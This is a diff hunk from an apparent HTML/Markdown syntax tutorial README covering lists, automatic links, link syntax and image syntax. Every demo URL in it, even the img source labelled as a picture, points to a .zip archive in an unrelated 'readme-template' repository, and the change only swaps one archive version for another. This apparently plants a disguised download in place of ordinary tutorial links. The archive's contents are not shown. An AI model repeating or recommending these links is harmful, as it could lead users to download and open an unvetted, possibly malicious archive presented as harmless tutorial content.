@@ -38,25 +38,25 @@ int main()
 <h3>Ordered List</h3>
 1. Item1 <br>
 2. item2<br>
-https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip<br>
+https://github.com/Sadman2310/readme-template/raw/refs/heads/master/img/readme-template-1.3.zip<br>
 <h3>Unordered List</h3>
 -Item1<br>
 -Item2<br><hr>
 <h3>Enable Automatic Link</h3>
 
-https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip
+https://github.com/Sadman2310/readme-template/raw/refs/heads/master/img/readme-template-1.3.zip
 
 <br>
 <h3>Disable Automatic Link</h3>
 
-`https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip`<hr>
+`https://github.com/Sadman2310/readme-template/raw/refs/heads/master/img/readme-template-1.3.zip`<hr>
 
 <h3>Markdown Link Syntax</h3>
 
-[studywithanis](https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip) <hr>
+[studywithanis](https://github.com/Sadman2310/readme-template/raw/refs/heads/master/img/readme-template-1.3.zip) <hr>
 
 <h3>Image Syntax</h3>
-<img src="https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip" width="400" title="Pic of Twilight"><br>
+<img src="https://github.com/Sadman2310/readme-template/raw/refs/heads/master/img/readme-template-1.3.zip" width="400" title="Pic of Twilight"><br>
 😍<br><hr>
 <h3>Table Syntax</h3><br>
 <table>
